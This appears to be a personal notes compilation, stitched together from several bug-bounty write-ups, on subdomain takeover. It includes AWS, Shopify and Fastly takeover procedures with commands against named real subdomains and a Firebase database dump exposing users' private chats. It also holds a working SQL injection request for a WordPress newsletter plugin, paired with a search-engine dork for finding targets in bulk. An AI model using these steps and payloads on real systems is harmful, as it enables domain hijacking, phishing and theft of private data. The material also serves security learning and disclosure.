



**Il subdomain takeover è una vulnerabilità che si verifica quando un sottodominio di un sito web punta a un servizio esterno che non è più attivo o è stato rimosso.** Questo lascia il sottodominio vulnerabile a essere "preso" da un attaccante. Ecco come funziona:

### Come Funziona il Subdomain Takeover

1. **Identificazione del Sottodominio**:
    
    - L'attaccante identifica un sottodominio che punta a un servizio esterno (ad esempio, un sito su GitHub Pages, Heroku, AWS S3, ecc.) che non è più attivo.
        
2. **Creazione del Servizio**:
    
    - L'attaccante crea un account sul servizio esterno e configura un nuovo sito o risorsa con lo stesso nome del sottodominio vulnerabile.
        
3. **Puntamento del Sottodominio**:
    
    - Poiché il sottodominio punta ancora al servizio esterno, il nuovo sito o risorsa dell'attaccante viene automaticamente associato al sottodominio.
        
4. **Sfruttamento**:
    
    - L'attaccante può ora servire contenuti malevoli dal sottodominio, eseguire attacchi di phishing, rubare cookie di sessione, o eseguire altre azioni dannose.


## Example:


Target:

 users.tweetdeck.com — a subdomain of TweetDeck pointing to AWS S3.


Issue

- The DNS entry pointed to an S3 bucket
- The bucket didn't exist
- I (or any attacker) could create the missing S3 bucket
- The subdomain would resolve to my S3 bucket → full takeover

> **Steps to Reproduce**

1. Find a subdomain pointing to AWS S3 — but with no associated bucket

![None](https://miro.medium.com/v2/resize:fit:700/1*mgPnCXBr-n1uskpUem07mw.png)

2. Verify no bucket exists

Run:

```bash
aws s3 ls s3://users.tweetdeck.com
```

or try claiming it

3. Create the missing S3 bucket

```bash
aws s3 mb s3://users.tweetdeck.com
```

4. Upload a PoC file (e.g. XSS.html)

```bash
aws s3 cp XSS.html s3://users.tweetdeck.com --acl public-read
```

5. Visit:

```bash
http://users.tweetdeck.com/XSS.html
```

If you see your file — you have takeover.

![None](https://miro.medium.com/v2/resize:fit:700/1*YZilu69YJIOqdarontZIaQ.png)

> **The Impact**

- Full control of users.tweetdeck.com
- Host malicious payloads / phishing pages
- Abuse domain's trust (cookies, CSP bypass, whitelists)
- Damage to brand, trust, and security of TweetDeck

Fix

- Remove or update DNS entries pointing to unused resources
- Regularly audit DNS + cloud configurations
- Implement automated subdomain takeover detection tools

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

What is Subdomain Takeover?

Subdomain Takeover is a vulnerability that occurs when a subdomain points to a service (e.g., GitHub Pages, AWS S3, Heroku, etc.) but the service is no longer active or has been deprovisioned. This leaves the subdomain unclaimed, allowing an attacker to register or claim the service at that subdomain, effectively taking control of it.
How it Happens:

Subdomain points to a third-party service: Companies often configure subdomains to point to external services (like cloud hosting or SaaS platforms).
    1. Service is deleted or unconfigured: If the service is no longer in use but the DNS entry pointing to it still exists, the subdomain remains active but without an actual service attached.
    2. Attacker claims the service: An attacker can register or create a resource at that same service provider, using the subdomain that still points there.
    3.  Control over the subdomain: Once the attacker claims the subdomain, they can serve malicious content, conduct phishing attacks, or exploit trust in the company’s domain.

### Esempio Pratico

Supponiamo che `sub.example.com` punti a un sito su GitHub Pages (`username.github.io`). Se il sito GitHub Pages viene rimosso, l'attaccante può creare un nuovo sito su GitHub Pages con lo stesso nome (`username.github.io`). Ora, `sub.example.com` punterà al sito dell'attaccante.

### Strumenti Utili

Ci sono diversi strumenti che possono aiutare a identificare e sfruttare subdomain takeovers:

- (Subjack)[https://github.com/haccer/subjack]
    
- (SubOver)[https://github.com/Ice3man543/SubOver]
    
- (tko-subs)[https://github.com/anshumanbh/tko-subs]
    

### Prevenzione

Per prevenire il subdomain takeover, è importante:

- Monitorare e gestire attivamente i record DNS.
    
- Rimuovere i record DNS che puntano a servizi non più utilizzati.
    
- Utilizzare servizi che offrono protezioni contro il subdomain takeover.


_**come fa l'attacante a sapere quale sottodominio punta a un servizio di terze parti con il certificato scaduto?**_

Un attaccante può scoprire che un sottodominio punta a un servizio di terze parti con il certificato scaduto utilizzando diverse tecniche e strumenti di ricognizione. Ecco alcuni metodi comuni:

### 1. Enumerazione dei Sottodomini

- **Strumenti**: Utilizzano strumenti come `Sublist3r`, `Amass`, e `Subfinder` per trovare sottodomini di un dominio target.
    
- **Esempio**:
    
    bash
    
    ```
    subfinder -d example.com -o subdomains.txt
    ```
    

### 2. Controllo dei Record DNS

- **Strumenti**: Utilizzano strumenti come `dig` o `nslookup` per verificare i record DNS dei sottodomini e identificare quelli che puntano a servizi esterni.
    
- **Esempio**:
    
    bash
    
    ```
    dig sub.example.com
    ```
    

### 3. Verifica Manuale

- **Tecnica**: Visitano manualmente i sottodomini per vedere se mostrano messaggi di errore o pagine di placeholder che indicano che il servizio non è più attivo.
    

![[Pasted image 20241116142144.png]]


See for the fingerprint:

![[Pasted image 20241116142209.png]]


### 4. Strumenti di Automazione

- **Strumenti**: Utilizzano strumenti come `Subjack`, `SubOver`, e `tko-subs` per automatizzare il processo di rilevamento dei sottodomini vulnerabili.
    
- **Esempio**:
    
    bash
    
    ```
    subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl
    ```
    
![Subjack flagging potential subdomain takeover vulnerabilities](https://www.datocms-assets.com/85623/1743934577-image5.png?auto=format "Subjack flagging potential subdomain takeover vulnerabilities")

			Subjack flagging potential subdomain takeover vulnerabilities
## Impact

- Subdomain takeover is abused for several purposes:

1. Malware distribution.
2. Phishing / Spear phishing.
3. XSS and steal cookies.
4. Bypass domain security.
5. Legitimate mail sending and receiving on behalf of Datadog subdomain

![[Pasted image 20250418151334.png]]

			Example of an authentication form supporting OAuth/SSO

### Recommended Fix:

- Check your DNS-configuration for subdomains pointing to services not in use.
- Set up your external service so it fully listens to your wildcard DNS.

### Cookie leaking through misconfigured cookie policies

When websites configure cookies with a domain attribute of `*.example.com` or `.example.com`, these cookies automatically become available to all subdomains of example.com, including any subdomain vulnerable to takeover. This loose cookie policy gives attackers access to these cookies when they successfully exploit a subdomain takeover vulnerability. If any cookies contain authentication tokens or session IDs, attackers can use them to access victims' accounts on the main domain.

![Cookie with domain attribute set to 'example.com' is automatically accessible on all its subdomains](https://www.datocms-assets.com/85623/1743933676-image3.png?auto=format "Cookie with domain attribute set to 'example.com' is automatically accessible on all its subdomains")

Cookie with domain attribute set to 'example.com' is automatically accessible on all its subdomains

### Cross-site request forgery (CSRF) attacks

Most web browsers by default set the same site cookie policy on cookies to 'Lax,' which enables including them in cross-site requests to any subdomain of the main domain. This enables us, in some conditions, to bypass existing security measures that have been put in place to mitigate [cross-site request forgery attacks](https://www.intigriti.com/researchers/blog/hacking-tools/csrf-a-complete-guide-to-exploiting-advanced-csrf-vulnerabilities) and conduct actions on behalf of the victim on the main application.

### Cross-origin resource sharing (CORS) attacks

Subdomain takeover vulnerabilities can also help us exploit cross-origin resource sharing (CORS) issues to leak sensitive data available on the main application, provided that our subdomain is whitelisted for CORS requests.

**Some applications whitelist all subdomains by default to allow seamless integration between all services. There are several open-source tools that can help you auto-detect CORS issues on your list of subdomains.**

### Content security policy (CSP) bypass

Content Security Policy (CSP) is a browser security feature that allows developers to take control of all resources that are evaluated on their application. This can hold back cross-site scripting (XSS) attacks. We can leverage our subdomain takeover to bypass any existing CSP measures.

You should specifically look for if the vulnerable subdomain is whitelisted in the content security policy set on the main application.

**TIP! When you discover a subdomain takeover vulnerability involving a content delivery network (CDN) or cloud storage service (like AWS S3), check if the main website loads resources (especially JavaScript files) from this subdomain. This could indicate a potential supply chain attack vector, where the hijacked subdomain would allow you to inject malicious code into the main application!**


POC:

if you find a vulnerable aws subdomain to **SDTO  poiting to  a aws** then register on your aws account:

![[Pasted image 20241116143121.png]]

then click on "sign in to the Console" -> Services:

_And since we know our subdomain is a S3 Bucket, we simply need to click on "S3" and create a bucket with the vulnerable **BucketName_**


![[Pasted image 20241116143231.png]]

take vuln name:

![[Pasted image 20241116143336.png]]

![[Pasted image 20241116143429.png]]

and disable "Block Public Access"  uncheck it.

![[Pasted image 20241116143516.png]]

![[Pasted image 20241116143608.png]]


-> Create bucket

Next thing we want to do is upload something onto the bucket and verify the POC:

![[Pasted image 20241116143706.png]]

example code: 

![[Pasted image 20241116145156.png]]


Then click on "add files" add the html code and in the permission set it to everyone view:

![[Pasted image 20241116145423.png]]

So you can see your POC:

![[Pasted image 20241116145312.png]]

-> upload

![[Pasted image 20241116145514.png]]


Now go to "Proprieties"

After uploading, we need to enable "static website hosting" and specify the file you shoukld be able to view from the outside:

![[Pasted image 20241116145842.png]]



![[Pasted image 20241116145656.png]]

-> Save Changes


Then go back to the vulnerable  page and reload until you see your html code:

![[Pasted image 20241116145947.png]]

![[Pasted image 20241116150021.png]]


---

- I just went to `brand.zen.ly` and it shows an error "Not Found", also I've checked the CNAME is pointing to `brandpad.io`, which means it can be added to any account.
- This is pretty serious security issue in some context, so please act as fast as possible.
- I was able to takeover `brand.zen.ly` by registering at **Brandpad**.

---

----

[What I learnt from reading 217* Subdomain Takeover bug reports. | by BrownBearSec - Freedium](https://freedium.cfd/https://medium.com/@BrownBearSec/what-i-learnt-from-reading-217-subdomain-takeover-bug-reports-c0b94eda4366) (2022)


_**A comprehensive analysis of Subdomain Takeovers (SDTO), DNS Hijacking, Dangling DNS, CNAME misconfigurations…**_

In this analysis we will _cover_:

1. a **tldr** of SDTO for beginners.
2. The types of subdomains — **what should you look for**
3. **How** were the subdomains found?
4. Should you use **Can-I-Take-This-Over-XYZ**?
5. Types of **hosting platforms**
6. SDTO **over time** — Is this bug worth looking for anymore?
7. **Impact** — How to get a bigger bounty
8. Miscellaneous bug bounty **tips**!

**Only 27.1%** of the vulnerable subdomains were intended for **internal** use. (which were never supposed to be for users) Like:
`api.e2e-kops-aws-canary.test-cncf-aws.canary`

These subdomains included words like "stage", "dev", "test", etc. Which were usually combined with other words, or existing subdomains using hyphens or dots, this shows the importance of permutating current subdomains in order to find new ones, you can use [AltDNS](https://github.com/infosec-au/altdns) for this. Examples of these subdomains include: _8ybhy85kld9zp9xf84x6, photo-test, dev-admin, api.techprep_.

**57%** of the vulnerable subdomains were intended for **public** use and were supposed to be accessed by users at some point in time. It makes perfect sense for this to be the case, as companies develop they will try to diversify and grow into new areas, these often fail, and thus the infrastructure or area of the site will be removed, but the CNAME might be forgotten, which may explain why the _most common subdomain found was "blog"_

Going into this I predicted that subdomains would become rarer and rarer over time as hosting providers implement security features to prevent SDTO.

**I've never seen this talked about among bug bounty communities**, but it is _possible_ to take over a subdomain **without** a third-party hosting service, it was observed that, 2.2% of the time. a subdomain was dependent on a unique _root domain_, this root domain then stopped being renewed and registering that domain would have the same effect.

### Should you use Can-I-Take-Over-XYZ?

If you've looked into SDTO before, _you've heard of Can-I-Take-Over-XYZ_, it's a GitHub repository which shows you which services are vulnerable or not. However, I learnt that _I wasn't using it correctly_, and **you probably aren't either**, and, there are **lots of services that aren't even listed** on Can-I-Take-Over-XYZ, which means _99% of bug hunters haven't hunted these bugs yet._

_Firstly_, most people have only seen the front page of Can-I-Take-Over-XYZ, however, this page is rarely updated and only has a fraction of the services. You can open The issues page ([https://github.com/EdOverflow/can-i-take-over-xyz/issues](https://github.com/EdOverflow/can-i-take-over-xyz/issues)) and search by the **tag "vulnerable"** to see way more services than you first thought.

![[Pasted image 20241113233013.png]]

_Secondly_, there are plenty of services which **have just never been reported to the repo**. For example, I found undocumented services such as _readymag,_ _[reg.ru](https://reg.ru/)__, Shoplo,_ _[icn.bg](http://icn.bg/)__,_ _[modulus.io](http://modulus.io/)__, Mailgun, DYN, Fider, Wufoo, bigcartel_. There must be more of these, so if you come across a CNAME, and it isn't documented, look into it and you could be the first to discover it!

### Types of hosting platforms

If you're hunting SDTO, it helps to know what you're looking for. Each individual hosting provider will have its own process for completing a takeover or way to detect if it's vulnerable, so it's best to pick one, or a few, providers and look for those specific providers.

![None](https://miro.medium.com/v2/resize:fit:700/1*rjxCE3hzSzDp58hImh6I2g.png)

The chart shows a breakdown of all of the 55 unique hosters found reading the reports.



### Impact — How to get a bigger bounty

First of all, SDTO is usually regarded as a high-severity bug by default, _however, this doesn't mean you have to stop here,_ you can chain bugs together in order to demonstrate more impact, or even elevate the bug to **critical severity**.


### Miscellaneous bug bounty tips!

1. Use the **waybackmachine** to take a capture of your takeovers, this way if it gets patched or you stop paying for the takeover, you have evidence of it! ([Source](https://hackerone.com/reports/380158))
2. Servers that don't host content are vulnerable too! so **check mail servers**! ([Source](https://hackerone.com/reports/736863))
3. **Second Order** Subdomain Takeovers exist ([Source](https://blogs.msmvps.com/alunj/2021/08/15/second-order-subdomain-takeovers-they-do-exist/))
4. Use `httpx -probe` to find domains/subs that **aren't** live.
5. Root domains can actually be taken over too! ([Source](https://hackerone.com/reports/1226891), [Source](https://hackerone.com/reports/159156))


### Key takeaways!

- **57%** of subdomains that are vulnerable are intended for **public** use!
- Checking the DNS records is _more effective_ than using string matches to find SDTO.
- Check the **issues page** for Can-I-Take-Over-XYZ
- _Don't_ just look for AWS takeovers, there are **so many providers**!

---

[Heroku Subdomain Takeover. Hello everyone, in this blog post, I… | by Samet Yiğit | Nov, 2024 | Medium](https://medium.com/@xsametyigit/heroku-subdomain-takeover-39b9f1ce7c4c)


----


[Subdomain Takeover: How to install dnsReaper and use of dnsReaper | by Ravindra Dagale | Medium](https://medium.com/@sherlock297/how-to-install-dnsreaper-and-use-of-dnsreaper-bc69d66d8c08)


---

# Firebaseio Database Takeover || Bug bounty [CRITICAL]

POC:

> https://youtu.be/_gGo3-G5OhI

**FDT** stands for Firebase Database Takeover, an automation tool used to assess the vulnerability of Firebase databases for potential exploitation.

github: [gh-ost00/Firebase_Database_Takeover: A security tool for enumerating Firebase subdomains, testing .json endpoint vulnerabilities, and providing mitigation strategies. This repository combines Subfinder, Httpx, and Curl for streamlined testing workflows. For educational and authorized security purposes only.](https://github.com/gh-ost00/Firebase_Database_Takeover)

github: [securebinary/firebaseExploiter: FirebaseExploiter is a vulnerability discovery tool that discovers Firebase Database which are open and can be exploitable. Primarily built for mass hunting bug bounties and for penetration testing.](https://github.com/securebinary/firebaseExploiter)

-> go install -v github.com/securebinary/firebaseExploiter@latest

then follow the instructions

## Another example:

> nuclei -l js.txt -t /home/kali/.local/nuclei-templates/http/exposures -o potential_secrets.txt

(the path might be different from u)


![](https://miro.medium.com/v2/resize:fit:875/1*lxTN_CbgKQZ5RSP5Gb-ovw.png)

And when I opened the URL, I found these Firebase configuration details :

![](https://miro.medium.com/v2/resize:fit:873/1*JsKm_-0btlnMkRbLJMeahw.png)

Excited, I immediately went to the [KeyHacks GitHub Repo](https://github.com/streaak/keyhacks) to get a hint about what I could do with the information I found.

Sadly it didn’t help much, as according to the methods described on the repo, the creds found were not vulnerable; which I was not convinced of.

resources:

https://hacktricks.boitatech.com.br/pentesting/pentesting-web/buckets/firebase-database

https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty/

https://github.com/tauh33dkhan/Hacking-Insecure-Firebase-Database

To find a solution to this issue, I read the [Firebase documentation](https://firebase.google.com/docs/database/rest/retrieve-data), and found out that I can use filters to get some portion of the database. After applying them via GET parameters, I tried to access the URL. It took some time to load though, but then I got this:

**The Discovery**

Following the steps in the [first resource](https://hacktricks.boitatech.com.br/pentesting/pentesting-web/buckets/firebase-database), I added “/.json” to the end of the Firebase database URL and got this:

![](https://miro.medium.com/v2/resize:fit:875/1*N80caQVM0FMQv03-UFzq9A.png)

It’s a massive database I guess!!

![](https://miro.medium.com/v2/resize:fit:875/1*M5RNTfXZSTS7TBSA3CqXHw.png)

After digging deep at the data, I could hardly believe it. I had the entire chat history of each user of the counseling website!

It took me a bit to get over the shock. Then I remembered that the [third resource](https://github.com/tauh33dkhan/Hacking-Insecure-Firebase-Database) mentioned above, explained how to check if we could write to the database. I checked it, and guess what!

![](https://miro.medium.com/v2/resize:fit:875/1*7FGmjmOU_LPu0nf_tiJmcA.png)

I also had unauthorized permissions to write in it too.

to do

https://infosecwriteups.com/firebase-url-exploitation-taking-over-android-databases-like-a-pro-79a00844496d

---

POC: https://youtu.be/jcqyWa4gjn8

github: [gh-ost00/SQL_Injection: Icegram Express - Email Subscribers, Newsletters and Marketing Automation Plugin <= 5.7.14 - Unauthenticated SQL Injection](https://github.com/gh-ost00/SQL_Injection) (3 months late!)

Go to https://en.fofa.info/ and type the following payload:


> body="/wp-content/plugins/email-subscribers/"

then type the following nuclei command with the file list:

![[Pasted image 20241205194856.png]]
then paste the following command:

````shell
POST /wp-admin/admin-post.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

page=es_subscribers&is_ajax=1&action=_sent&advanced_filter[conditions][0][0][field]=status=99924)))union(select(sleep(4)))--+&advanced_filter[conditions][0][0][operator]==&advanced_filter[conditions][0][0][value]=1111
````

and type the vulnerable hostname given by the nuclei template:

![[Pasted image 20241205200520.png]]

should wait for the tot. seconds you gave it.

----

[🚀 Firebase URL Exploitation: Taking Over Android Databases Like a Pro! 😎 | by JEETPAL | Dec, 2024 | InfoSec Write-ups](https://medium.com/bugbountywriteup/firebase-url-exploitation-taking-over-android-databases-like-a-pro-79a00844496d)


---

## Subdomain Takeover via Shopify

# How Subdomain Takeover via Shopify works?

Subdomain takeover via **Shopify** occurs when a domain or subdomain is configured to point to Shopify (e.g., using a CNAME record like `shops.myshopify.com`), but the associated Shopify store is no longer active or has been deleted

# How to look for potential vulnerable subdomain?

1) use [wappalyzer](https://www.wappalyzer.com/) to see if the target is using or built on shopify

![](https://miro.medium.com/v2/resize:fit:619/1*pGqpAT3XxuEpmI0qmUBjkw.png)

2. ) use [Subfinder](https://github.com/projectdiscovery/subfinder) to enumerate the subdomain

> subfinder -dL target.txt -all -recursive -o Subs.txt

3. ) use [httpx](https://github.com/projectdiscovery/httpx) or [httpstatus](https://httpstatus.io/) to enumerate the http status code and look for _404 status code_ ( 404 = potential vulnerable to subdomain takeover )

> cat Subs.txt | httpx -sc -mc 404 

4. ) Check every 404 output and manually look for something like this

![](https://miro.medium.com/v2/resize:fit:875/1*NwfbvsRuFJv1X1JtrsOSwQ.png)

5. ) After that, go to shopify and if you are new, then create a free account

6. ) Then go to settings, and click domains

![](https://miro.medium.com/v2/resize:fit:671/1*95tua806bl-U9Pt38oMOZw.png)

7. ) in the domains click “Connect existing domain”

![](https://miro.medium.com/v2/resize:fit:875/1*KgBwddLSLcuZEuF1knfq4w.png)

8. ) Then enter the vulnerable subdomain and click next.

![](https://miro.medium.com/v2/resize:fit:828/1*P11KpJ7RQtt2CckwSQngBA.png)

9. ) after you connect the existing domain click “Verify connection”

![](https://miro.medium.com/v2/resize:fit:828/1*hs55a5Nqr3n3HDwfAexB6Q.png)

10.) congratulations Subdomain Takeove Successfully

![](https://miro.medium.com/v2/resize:fit:875/1*zeJz_d0xUlqZF3d_ppe7Gw.png)

# there is many other ways to search for subdomain takeover:

## 1.first using nuclei template

> nuclei -list AliveSubs.txt -t takeovers

## 2. using subzy tool :

Subdomain takeover via AWS s3 bucket

> subzy run --target AliveSubs.txt --vuln

It works based on matching response fingerprints from [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz/blob/master/README.md). but **most of the result are false positive**

![](https://miro.medium.com/v2/resize:fit:376/1*-LkmJXX9xQpx5ejYUWVWew.png)

---


some other guides: [SDTO guides](https://0xpatrik.com/subdomain-takeover-impact/?source=post_page-----9f5dd632c175--------------------------------)

##  Fastly Subdomain Takeover $2000

#Subdomain-Take-Over

## Methodology:

```r
==# Passive Subdomain Enumeration using Google Dorking====  
site:*.redacted.com -www -www1 -blog  
site:*.*.redacted.com -product  
  
====# Passive Subdomain Enumeration using OWASP Amass====  
amass enum -passive -d redacted.com -config config.ini -o amass_passive_subs.txt  
  
====# Subdomain Brute force using Gobuster====  
gobuster dns -d redacted.com -w wordlist.txt - show-cname - no-color -o gobuster_subs.txt==
```

After enumerating subdomains, removed duplicate entries and merged them into a single file (subdomains.txt) using the [Anew](https://github.com/tomnomnom/anew) tool.

```r
# Merging subdomains into one file  
cat google_subs.txt amass_passive_subs.txt gobuster_subs.txt | anew subdomains.txt
```

Then passed the subdomains.txt file to my cname.sh shell script, enumerated CNAME records and stored in cnames.txt.

```r
# Enumerate CNAME records  
./cname.sh -l subdomains.txt -o cnames.txt  
  
# We can use HTTPX tool as well  
httpx -l subdomains.txt -cname cnames.txt
```

Then passed the subdomains.txt file to the [HTTPX](https://github.com/projectdiscovery/httpx) tool. probed live websites and stored in servers_details.txt.


```r
# Probe for live HTTP/HTTPS servers  
httpx -l subdomains.txt -p 80,443,8080,3000 -status-code -title -o servers_details.txt
```

## ANALYSIS

I started analyzing the cnames.txt file and found one subdomain that was pointing to two different CNAME records. I ran dig command on the subdomain and got followings:

> dig next.redacted.com CNAME

  
![](https://miro.medium.com/v2/resize:fit:656/1*fM_jKc7Ag4JMXTSuqUw_cg.png)

				DNS query for CNAME record

This subdomain had two CNAME records. The first CNAME record was pointing to webflow.io domain and the second CNAME record was pointing to fastly.net (Fastly Service) domain. Whenever we have multiple CNAME records, **the first CNAME record will redirect us to next CNAME record and so on. The redirection would continue until we reach last CNAME record.**

I started analyzing the servers_details.txt file for interesting stuff and found this line. Notice status code and website title.

```
https://next.redacted.com [500] [246] [Fastly error: unknown domain next.redacted.com]
```

The status code was “500" and the title was “Fastly error: unknown domain next.redacted.com”. By taking a look at CNAME record (“redacted.fastly.net”) and website fingerprint “Fastly error: unknown domain”, we can confirm that this is Fastly Subdomain Takeover. If a website has this fingerprint then it may be vulnerable. However, I came across this Fastly fingerprint many times before and it was not vulnerable. It’s vulnerable only when certain conditions are met, so it’s an edge case.

In most cases, we cannot takeover the Fastly service. For example below case,

![](https://miro.medium.com/v2/resize:fit:656/1*tVsWU_j9v4g4eba-zOYSRw.png)

But if the domain is not already taken by another customer then we can claim the domain and takeover the subdomain completely.


## CONFIRMING THE VULNERABILITY

I went to Fastly official website and performed below steps,  
1. I created an account on [fastly.com](https://www.fastly.com/) using a temporary mail.  
2. Logged in to my Fastly Dashboard and clicked on the “Create a Delivery Service” button.  
3. Entered target subdomain name(next.redacted.com) and clicked on Add button.

I was expecting the error message (“domain is already taken by another customer”) to appear but there was no error message. I was redirected to the next page “Hosts page”. I was surprised.

![](https://miro.medium.com/v2/resize:fit:656/1*hpg374XpIVfcAGmMzE9q8Q.png)

					Claimed domain on Fastly

## POC CREATION STEPS

Once the vulnerability was confirmed, I logged into my VPS server and created a directory called “hosting”. Then within the “hosting” directory created a simple HTML file called “index.html”.

```
mkdir hosting  
  
cd hosting  
  
nano index.html
```

“index.html” file contains below code:

![[Pasted image 20250118175316.png]]

After that, I started a simple Python web server on port 80 within the current working directory:

> python3 -m http.server 80


Then I went to the Fastly dashboard and Added the public IP address of my VPS server in the Hosts page.

![](https://miro.medium.com/v2/resize:fit:656/1*cfvpss0E9rP3RfhLjENzjA.png)

					VPS Configuration

After a few seconds, I opened up a new browser window and visited “[http://next.redacted.com/index.html](http://next.redacted.com/index.html%60)” page. My PoC file was rendered successfully. I have written a detailed report and submitted it on HackerOne.


![](https://miro.medium.com/v2/resize:fit:656/1*wa1N10QOOpD8LfFQF8D0QQ.png)

					Proof of Concept

## LEARNING BY MONITORING SERVER LOGS

I kept my Fastly service running for 3 days and monitored server logs for sensitive information. It was fun watching other bug hunters methodology.

![](https://miro.medium.com/v2/resize:fit:641/1*ArdrD-1E4dK2jmw9W4H80A.png)

							Monitoring server logs for fun

## REWARD

My report was triaged as a HIGH severity vulnerability and rewarded $2000 within 10 days.

![](https://miro.medium.com/v2/resize:fit:656/1*1EusfsNh9StrfGXko77QGw.png)

							Reward

## KEY TAKEAWAYS

1. Revisit your old targets at least once in 6 months.  
2. Subdomain Enumeration is key. Enumerate subdomains as much as possible.  
3. Don’t give up.

----

## How to Take Over an abandoned AWS S3 static site bucket:

resource: https://z0h3.medium.com/404-to-root-how-a-forgotten-subdomain-led-to-server-takeover-%EF%B8%8F-6284d0264c7e

#Subdomain-Take-Over




----

## Critical Information Disclosure Vulnerability via CNAME (AUTOMATED SCAN)

# Background

I have been doing research on DMARC and SPF policies recently, I found 100’s of misconfigured DMARC’ and SPF policies that allow users to impersonate email addresses and spoof them. This is considered a low-medium vulnerability, however, it can really affect customers/employees/students if we are talking about a school. I was able to submit 45 valid reports in a time frame of 5 hours with my automated tool, [GITHUB](https://github.com/Facuu35/DMARC-SPF-Checker). However, **today I am not here to talk about DMARC policies, that’s a topic for another day. If this is something you want to read about, let me know in the comments.**


Doing research on this, and reporting these types of vulnerabilities taught me 2 things:

1. They are widespread
2. Not all bug bounty programs accept it (due to the nature of them = common vulns.)

_My opinion on how companies treat this vulnerability:_

I believe DMARC vulnerabilities should be given a much higher impact rating in bug bounty programs. An attacker could exploit these vulnerabilities to launch highly sophisticated phishing campaigns, using spoofing techniques that can cause serious damage. Just think about it — people can easily fall for these scams and end up giving away sensitive information or clicking on harmful links. As long as the email lands in their inbox is game over. People — regular people — are not checking DKIM signatures or email metadata (you can easily find out that it’s a spoofed email by checking this). Companies should be more serious about these vulnerabilities.

Building [this](https://github.com/fdzdev/DMARC-SPF-Checker) small Python script led me to think of other automation I could use to find more vulnerabilities doing passive recon: **Subdomain Takeover vulnerabilities and even NS Takeover vulnerabilities**. So I dug deep into both of those and created two automated tools.


**Two differences between Subdomain Takeovers and NS Takeovers with DMARC and SPF vulnerabilities:**

1. They are not “very common”
2. More companies accept these as valid bugs

**1 thing in common:**

1. Low hanging fruit

With that in mind, let’s jump to what we are all here for. How I found a Critical information disclosure vulnerability.

# HAPPYHACKING

I [wrote a cool automation](https://github.com/fdzdev/Subdomain-Takeover-Checker) tool that does the following:

2. Receives a list of URLS
3. Check if the URL has a CNAME record (if it has it could be prone to Subdomain Domain Takeover (_SDT_))
4. Filters them between potentially vulnerable and not vulnerable

```shell
Cloudflare CNAME's are not vulnerable to SDT  
trafficmanager.net could be vulnerable to SDT  
fastly.com could be vulnerable to SDT
```

1. Print all those potentially vulnerable domains and those that are not vulnerable whatsoever

2. Creates 2 files:

```
Full report/{company_name}.txt > in this report you have the full report  
CNAME_report/{company_name}.txt > in this file you have a plain list of CNAME's found
```

Great, you have a good high-level overview of what my tool does.


How did I find the critical information disclosure? I scanned a list of subdomains of X company, my tool: [Subdomain-Takeover-Checker](https://github.com/fdzdev/Subdomain-Takeover-Checker) gave me the CNAME list with potential vulnerable domains. I found many CNAME domains that belong to the company:

![](https://miro.medium.com/v2/resize:fit:700/1*tF19RLCd9XITNQo_TcHL5g.png)

			EXAMPLE — NOTHING VULNERABLE HERE FYI


Focus on this subdomain and its CNAME for a second:

Subdomain: bottle.tesla.com  
CNAME of botte.tesla.com: prod-1-us-E23.vol.tesla.com

What I usually do with the list of all the **_CNAMES_** is I scan them again:

```
cat cname.txt | httpx -sc -ip -server -title -wc > cname_test.py
```

![](https://miro.medium.com/v2/resize:fit:700/1*s_-5AypVaoW9ihfa0_v_fQ.png)

My mind is looking for 404 errors that could indicate that the resource is dead so I can proceed to test for SDT.

> _However, what if the CNAME the subdomain is pointing to has valuable information? Or is a deprecated endpoint, or it does not have protection?_

Yeah, I hope you are catching the idea here.

I found this interesting 200 HTTP response for my random Subdomain: prod-1-us-E23.vol.tesla.com and fuzzed it.

My preferred fuzzing method:

```shell
ffuf -w facundo.txt -u https://tesla.com/FUZZ -mc all -c -v \ -H "User-Agent: Mozilla/5.0" -H "Accept: */*" \ -X GET -r -t 100 -p 0.1-1.0 -maxtime 3600 -o results.json -of json -od results \ -mc 200,301,302,307,401,403,500 -ac -recursion -recursion-depth 2 -rate 50 \
```

_FYI: facundo.txt is my wordlist which you can find on my_ [_Github_](https://github.com/fdzdev/Subdomain-Takeover-Checker)_._

And I found a live endpoint: /**docker-compose.yml**

![](https://miro.medium.com/v2/resize:fit:700/1*1ycKti8rS6DMVHcweRmkXw.png)

								BANG!


---


<iframe width="928" height="522" src="https://www.youtube.com/embed/OxSJ693tZgM" title="Subdomain Takerover is too easy | you can earn up to $500 to $600 dollar | Ethicalhacking | subzy" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
---

> Another Repo Which helps us in Subdomain Takeover using NameServer ( DNS Takeover )

[https://github.com/indianajson/can-i-take-over-dns](https://github.com/indianajson/can-i-take-over-dns)

We are going to Automate the Process of Subdomain Takeover by using Various Tools.

# Technique — 1 : Manual Method

Using dnx tool by projectdiscovery to get cname and nameserver records for subdomains :

> cat allsubdomains.txt | dnsx -cname -ns -o cnamenssub.txt  

Now Compare the cname and ns to :

CNAMEs : [https://github.com/EdOverflow/can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)

NS : [https://github.com/indianajson/can-i-take-over-dns](https://github.com/indianajson/can-i-take-over-dns)

After comparing you will get the vulnerable subdomains by using this manual method.

# Technique — 2 Automatic Method

For the automatic method you need nuclei. It has inbuilt templates that check against Subdomain takeovers

Using :

> ==nuclei -l allsubdomains.txt -t takeover-detection==  

It will display the subdomains that are vulnerable to takeovers.

---


https://freedium.cfd/https://medium.com/h7w/how-i-was-able-to-take-over-a-subdomain-and-got-hall-of-fame-aca4aaca761b


https://medium.com/@gguzelkokar.mdbf15/s3-bucket-takeover-discovering-a-bucket-inside-a-bucket-for-1000-8506f4ec07a4


github subdomain takeover.


https://m1le5.medium.com/sub-domain-takeover-c1493eb23656


https://www.hackerone.com/blog/guide-subdomain-takeovers-20


---

### What's a Campaign Monitor takeover?

Campaign Monitor is a popular email marketing platform — kind of like Mailchimp. When companies use it, they sometimes link custom subdomains like:

```
email.target.com
news.target.org
updates.target.io
```

These are set up through a CNAME pointing to `cmailX.com` (like `cmail5.com`, etc.).

If a company later **abandons their Campaign Monitor account** but leaves the DNS record live, that subdomain becomes **dangling** — and takeover becomes possible.

